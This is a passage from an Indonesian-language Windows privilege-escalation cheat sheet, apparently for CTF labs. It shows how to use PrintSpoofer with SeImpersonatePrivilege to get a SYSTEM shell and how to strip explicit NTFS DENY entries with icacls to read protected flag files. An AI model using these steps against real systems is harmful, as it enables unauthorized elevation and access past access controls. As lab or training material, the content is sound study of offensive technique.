...
### Eksekusi Manual (PrintSpoofer) — Alternatif Modern
 
**PrintSpoofer** memanfaatkan bug Print Spooler service, lebih reliable di Windows 10/Server 2016-2019 dibanding JuicyPotato.
 
```cmd
# Transfer PrintSpoofer.exe ke target (kalau sudah ada akses SSH/SCP):
scp /root/Desktop/PrintSpoofer.exe user@target:C:/Users/user/PrintSpoofer.exe
 
# 1. Cek privilege dulu
whoami /priv
# Harus ada: SeImpersonatePrivilege
 
# 2. Spawn shell SYSTEM langsung
...
> `-i` = interactive (spawn shell baru), `-c` = command yang dijalankan sebagai SYSTEM.
 
---
 
## 4. Bypass Explicit DENY di NTFS ACL
 
### Konsep
 
Kadang sebuah file/folder **tetap "Access Denied" walaupun sudah jadi SYSTEM** atau bahkan setelah `takeown`. Ini terjadi karena ada **explicit DENY rule** di ACL — dan di Windows, **DENY selalu menang** dibanding ALLOW, tidak peduli seberapa tinggi privilege akun yang mengakses.
 
```
Urutan prioritas NTFS ACL (dari yang paling diutamakan):
...
> Kesalahan umum: mencoba `takeown` + `icacls /grant` berulang-ulang — ini **tidak akan berhasil** karena DENY yang sudah ada tetap diprioritaskan di atas ALLOW baru.
 
### Cara Identifikasi
 
```cmd
icacls C:\path\to\folder_or_file
 
# Contoh output yang menunjukkan masalah:
# NT AUTHORITY\SYSTEM:(OI)(CI)(DENY)(RX)   ← ini masalahnya!
# NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
# BUILTIN\Administrators:(I)(OI)(CI)(F)
```
 
### Solusi yang BENAR — Hapus DENY Rule Langsung
 
```cmd
# Hapus DENY rule untuk user/group tertentu (TANPA perlu takeown dulu)
icacls <path> /remove:d "NT AUTHORITY\SYSTEM"
icacls <path> /remove:d "Everyone"
icacls <path> /remove:d "<username>"
 
# /remove:d = remove DENY ACE secara spesifik
# Setelah DENY dihapus, ALLOW yang sudah ada otomatis berlaku
```
 
**Contoh kasus nyata:**
 
```cmd
# Folder dengan DENY untuk SYSTEM:
...
# Lalu langsung bisa diakses:
cd C:\Users\Administrator\flag
type flag4.txt
```
 
### Yang TIDAK Efektif (jangan buang waktu)
 
```cmd
# ❌ takeown tidak menghapus DENY yang sudah ada
takeown /f <path>
 
# ❌ grant ALLOW baru tidak mengalahkan DENY lama
icacls <path> /grant Administrators:F
 
# ❌ reset kadang masih kena DENY yang sama saat eksekusi
icacls <path> /reset
```
 
### Alur Troubleshooting "Access Denied" Meski SYSTEM
 
```
Access Denied padahal sudah SYSTEM?
        ↓
icacls <path>  → cek ACL
        ↓
Ada (DENY) di baris manapun?
        ↓
   YA → icacls <path> /remove:d "<user_yang_di-DENY>"
        ↓
   Masih ditolak? → cek juga file di dalamnya (folder
   dan file bisa punya ACL berbeda-beda!)
        ↓
   icacls <path>\<file> /remove:d "<user>"
```
